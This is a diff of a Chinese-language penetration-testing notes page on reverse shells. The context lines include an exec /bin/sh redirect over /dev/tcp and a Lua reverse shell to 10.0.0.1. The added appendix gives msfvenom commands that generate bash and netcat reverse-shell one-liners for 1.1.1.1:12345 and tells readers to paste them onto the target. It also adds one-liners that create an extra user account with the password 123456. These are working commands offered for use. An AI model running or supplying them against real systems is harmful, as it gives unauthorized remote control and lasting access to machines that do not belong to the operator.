@@ -100,7 +100,7 @@ client向server发送请求，server将命令内容响应给client,client 获取
 
 观察一下被控端反弹的 bash ，它的输入输出都连接着管道，同时其他句柄绑定有网络连接。
 
-![](../../.gitbook/assets/image%20%28455%29.png)
+![](../../.gitbook/assets/image%20%28457%29.png)
 
 2、EXEC反弹
 
@@ -112,7 +112,7 @@ exec /bin/sh 0</dev/tcp/127.0.0.1/8080 1>&0 2>&0
 
 连通状态和 nc 反弹是类似的， sh 的输入输出句柄都有网络连接 , 从而保证了网络与命令之间的实时连通
 
-![](../../.gitbook/assets/image%20%28457%29.png)
+![](../../.gitbook/assets/image%20%28459%29.png)
 
 当然为了保证网络与命令之间的实时连通 也不一定全是这种情况，大家可以了解一下 select ， epoll 机制
 
@@ -282,7 +282,7 @@ stty rows 42 columns 162
 
 ## 6、附录
 
-1、在思考——框架整理中，非交互式→连通类中，各脚本语言反弹shell方式如下：
+### 1、各脚本语言反弹shell方式
 
 ```text
 ## perl 版本： 
@@ -312,5 +312,51 @@ p.waitFor()
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 ```
 
-123
+### 2、若使用msfvenom
+
+学习过程中发现其实强大的 MSF 框架也为我们提供了生成一句话反弹 shell 的工具，即msfvenom 。绝对的实用，当我们不记得前面说的所有反弹 shell 的反弹语句时，只要我们有 Metasploit, 随时我们都可以使用 msfvenom -l 来查询生成我们所需要的各类命令行一句话
+
+1、查询 payload 具体路径
+
+我们直接可以使用 msfvenom -l 结合关键字过滤（如 cmd/unix/reverse ），找出我们需要的各类反弹一句话 payload 的路径信息
+
+```text
+msfvenom -l payloads 'cmd/unix/reverse'
+```
+
+![](../../.gitbook/assets/image%20%28455%29.png)
+
+查看以上截图，我们可以看到 msfvenom 支持生成反弹 shell 一句话的类型非常丰富，这里几乎是应有尽有，大家可以依据渗透测试对象自行选择使用
+
+2、生成命令行一句话
+
+依照前面查找出的命令生成一句话 payload 路径，我们使用如下的命令生成反弹一句话，然后复制粘贴到靶机上运行即可
+
+```text
+## bash  反弹一句话生成
+
+msfvenom -p cmd/unix/reverse_bash lhost=1.1.1.1 lport=12345 R
+
+## 阉割版 nc 反弹一句话生成
+
+msfvenom -p cmd/unix/reverse_netcat lhost=1.1.1.1 lport=12345 R
+```
+
+### 3、Linux下一句话添加账户
+
+```text
+ ## chpasswd  方法
+ 
+useradd guest;echo 'guest:123456'|chpasswd
+
+## useradd -p  方法
+
+useradd -p `openssl passwd 123456` guest
+
+## echo -e  方法
+
+useradd test;echo -e "123456n123456n" |passwd test
+```
+
+
 
